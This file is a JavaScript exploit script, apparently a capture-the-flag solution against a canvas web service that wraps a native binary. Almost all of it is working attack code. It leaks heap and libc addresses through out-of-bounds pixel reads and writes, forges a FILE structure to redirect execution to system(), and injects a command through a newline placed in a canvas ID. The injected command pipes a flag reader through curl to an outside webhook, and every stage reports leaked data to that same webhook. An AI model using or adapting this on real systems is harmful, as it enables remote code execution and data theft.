const B=BigInt,WH="https://webhook.site/385cfc34-c325-415a-94c2-79fc27fa6c14";
function p64(v){v=B(v);let r=[];for(let i=0;i<8;i++){r.push(Number(v&0xFFn));v>>=8n}return r}
function u64(b){let v=0n;for(let i=7;i>=0;i--)v=(v<<8n)|B(b[i]);return v}
function p32(v){v=Number(v);return[v&0xFF,(v>>8)&0xFF,(v>>16)&0xFF,(v>>24)&0xFF]}
async function api(p,o={}){return(await fetch(p,{...o,headers:{"Content-Type":"application/json"}})).json()}
async function C(i,w,h){return api("/api/canvas/create",{method:"POST",body:JSON.stringify({id:i,width:w,height:h})})}
async function D(i){return api("/api/canvas/delete/"+i,{method:"DELETE"})}
async function S(i,x,y,c){return api("/api/canvas/set",{method:"POST",body:JSON.stringify({id:i,x:Math.floor(x),y:y,color:c})})}
async function G(i){let r=await api("/api/canvas/get/"+i);return(r.pixels||[]).map(p=>parseInt(p,16))}
function px(pl){let o=[];for(const p of pl)o.push((p>>16)&0xFF,(p>>8)&0xFF,p&0xFF);return o}
async function ex(m){try{await fetch(WH+"?d="+encodeURIComponent(m),{mode:"no-cors"})}catch(e){}}
function hx(n,l){return n.toString(16).padStart(l,"0")}
async function sH(h){let b=p32(h);await S(2,(-30)>>>0,0,"0x"+hx((0<<16)|(0<<8)|b[0],6));await S(2,(-29)>>>0,0,"0x"+hx((b[1]<<16)|(b[2]<<8)|b[3],6))}
async function sP(a){let r=p64(a);await S(2,(-27)>>>0,0,"0x"+hx((0<<16)|(r[0]<<8)|r[1],6));await S(2,(-26)>>>0,0,"0x"+hx((r[2]<<16)|(r[3]<<8)|r[4],6));await S(2,(-25)>>>0,0,"0x"+hx((r[5]<<16)|(r[6]<<8)|r[7],6))}
async function aR(a,n){await sH(n||3);await sP(a);return px(await G(1))}
async function wQ(a,v){await sH(3);await sP(a);let r=p64(v);await S(1,0,0,"0x"+hx((r[0]<<16)|(r[1]<<8)|r[2],6));await S(1,1,0,"0x"+hx((r[3]<<16)|(r[4]<<8)|r[5],6));await S(1,2,0,"0x"+hx((r[6]<<16)|(r[7]<<8)|0,6))}
async function wAt(cid,off,data){
  let sp=Math.floor(off/3),ep=Math.floor((off+data.length-1)/3);
  for(let pi=sp;pi<=ep;pi++){
    let b=[0,0,0],bo=pi*3;
    for(let j=0;j<3;j++){let idx=bo+j-off;if(idx>=0&&idx<data.length)b[j]=data[idx]}
    if(b[0]||b[1]||b[2])await S(cid,pi,0,"0x"+hx((b[0]<<16)|(b[1]<<8)|b[2],6));
  }
}

(async()=>{
try{
await ex("S");
try{await api("/api/canvas/exit",{method:"POST"})}catch(e){}
await C(1,1,1);await C(2,1,1);

await sH(0x20);
let heap=u64(px(await G(1)).slice(0x30,0x38))-0x1720n;
await ex("h="+heap.toString(16));

await C(3,19,19);await C(4,1,1);await D(3);
let libc=u64((await aR(heap+0x1760n,3)).slice(0,8))-(0x1edc60n+0x60n);
await ex("l="+libc.toString(16));
let sys=libc+0x4d880n,iol=libc+0x1ee660n,wfj=libc+0x1ef020n;

let oh=u64((await aR(iol,3)).slice(0,8));

await C(5,50,50);
let pix1=heap+0x16e0n;
await sH(0x28);await sP(pix1);
let p5=u64(px(await G(1)).slice(0x70,0x78));
await ex("p="+p5.toString(16));
if(p5==0n){await ex("X");return}

let ff=p5,fwd=p5+0x200n,fwvt=p5+0x300n;

// Fake FILE at p5 — command: /app/read_flag | curl → webhook (87 bytes, fits before 0x68)
let cmdStr="    /app/read_flag|curl -sd@- "+WH;
let cmd=[];for(let i=0;i<cmdStr.length;i++)cmd.push(cmdStr.charCodeAt(i));cmd.push(0);
await wAt(5,0,cmd);
// No need to set _IO_write_ptr separately — wide path trigger uses _wide_data fields
await wAt(5,0x68,p64(oh)); // _chain
await wAt(5,0x88,p64(ff+0xf0n)); // _lock
await wAt(5,0xa0,p64(fwd)); // _wide_data
await wAt(5,0xc0,[1,0,0,0]); // _mode=1
await wAt(5,0xd8,p64(wfj)); // vtable=_IO_wfile_jumps
// Fake wide_data at +0x200
await wAt(5,0x200+0x20,[1]); // _IO_write_ptr=1
await wAt(5,0x200+0xe0,p64(fwvt)); // _wide_vtable
// Fake wide vtable at +0x300: __doallocate=system at +0x68
await wAt(5,0x300+0x68,p64(sys));
await ex("wf");

// Overwrite _IO_list_all
await wQ(iol,ff);
await ex("ow");

// Trigger: inject EXIT via CREATE with newline in canvas_id
// CREATE "99\nEXIT" → binary processes CREATE 99, then EXIT
// EXIT → _IO_flush_all → FSOP → system("/app/read_flag") → flag on stdout pipe
// Flask reads "OK 99" as CREATE response. Flag stays in pipe buffer.
// Next API call reads flag from pipe!
await ex("TR");
try{
  // Inject EXIT: canvas_id contains \n
  let r1=await api("/api/canvas/create",{method:"POST",body:JSON.stringify({id:"99\nEXIT",width:1,height:1})});
  await ex("C="+JSON.stringify(r1));
}catch(e){await ex("CE="+e.message)}

// Read flag from pipe via DELETE API — response includes raw pipe data as error message!
// send_command sends "DELETE 99" to dead binary, recvline reads flag from pipe
// Flag doesn't start with "OK" → Flask returns {"status":"error","message":"FLAG_HERE"}
try{let r=await D(99);await ex("F="+JSON.stringify(r))}catch(e){await ex("FE="+e.message)}
try{let r=await D(98);await ex("F2="+JSON.stringify(r))}catch(e){await ex("F2E="+e.message)}
try{let r=await D(97);await ex("F3="+JSON.stringify(r))}catch(e){await ex("F3E="+e.message)}
await ex("D");
}catch(e){await ex("E="+e.message)}
})();
